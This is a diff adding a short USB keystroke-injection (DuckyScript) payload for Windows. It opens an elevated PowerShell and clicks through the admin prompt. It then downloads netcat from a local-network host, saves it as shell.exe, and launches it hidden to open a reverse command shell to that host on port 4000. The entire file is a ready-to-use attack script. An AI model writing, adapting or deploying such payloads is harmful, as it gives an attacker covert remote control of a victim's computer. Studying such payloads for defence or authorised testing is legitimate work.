@@ -1,0 +1,20 @@
+DELAY 3000
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -verb runAs
+ENTER
+DELAY 5000
+ALT y
+DELAY 1000
+STRING cd \; md sachin; cd sachin; echo (powershell Invoke-webRequest -outfile shell.exe 'http://192.168.1.51/nc.exe') > psh.ps1; powershell -ExecutionPolicy Bypass -file psh.ps1
+ENTER
+DELAY 7000
+STRING cmd.exe
+DELAY 1000
+ENTER
+DELAY 2000
+STRING START /MIN shell.exe 192.168.1.51 4000 -e cmd.exe -d & exit
+ENTER
+DELAY 1000
+STRING EXIT
+ENTER
